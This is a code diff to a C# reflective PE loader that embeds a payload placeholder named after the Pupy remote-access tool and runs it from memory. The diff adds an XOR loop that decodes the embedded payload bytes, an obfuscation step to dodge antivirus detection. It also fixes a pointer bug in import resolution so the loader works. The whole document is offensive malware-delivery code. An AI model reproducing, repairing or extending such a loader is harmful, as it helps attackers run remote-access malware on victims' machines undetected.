@@ -86,6 +86,9 @@ namespace PELoader
             DllEntryDelegate _dllEntry;
             byte[] RawPE = <PUPYx64_BYTES>;
             //byte[] decompressed = Decompress(FromBase64);
+            for (int i=0; i<RawPE.Length; i++) {
+                RawPE[i] ^= 0xFF;
+            }
              
             PELoader pe = new PELoader(RawPE);
  
@@ -188,7 +191,7 @@ namespace PELoader
  
             //Resolve Imports
  
-            IntPtr z = (IntPtr)((byte *)codebase + pe.ImageSectionHeaders[1].VirtualAddress);
+            //IntPtr z = (IntPtr)((byte *)codebase + pe.ImageSectionHeaders[1].VirtualAddress);
             IntPtr oa1 = (IntPtr)((byte *)codebase + pe.OptionalHeader64.ImportTable.VirtualAddress);
             int oa2 = Marshal.ReadInt32((IntPtr)((byte *)oa1+ 16));
  
@@ -198,7 +201,7 @@ namespace PELoader
                 IntPtr a1 = (IntPtr)((byte *)codebase + (20 * j) + (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                 int entryLength = Marshal.ReadInt32((IntPtr)((byte *)a1 + 16));
                 IntPtr a2 = (IntPtr)((byte *)codebase + pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2)); //Need just last part? 
-                IntPtr dllNamePTR = (IntPtr)((byte *)codebase + Marshal.ReadInt32((IntPtr)((byte *)(a1+ 12))));
+                IntPtr dllNamePTR = (IntPtr)((byte *)codebase + Marshal.ReadInt32((IntPtr)((byte *)(a1)+ 12)));
                 string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                 if (DllName == "") { break; }
  
@@ -652,7 +655,7 @@ namespace PELoader
                 // Add 4 bytes to the offset
                 stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
  
-                UInt32 ntHeadersSignature = reader.ReadUInt32();
+                reader.ReadUInt32();
                 fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                 if (this.Is32BitHeader)
                 {
@@ -687,7 +690,7 @@ namespace PELoader
                 // Add 4 bytes to the offset
                 stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
  
-                UInt32 ntHeadersSignature = reader.ReadUInt32();
+                reader.ReadUInt32();
                 fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                 if (this.Is32BitHeader)
                 {
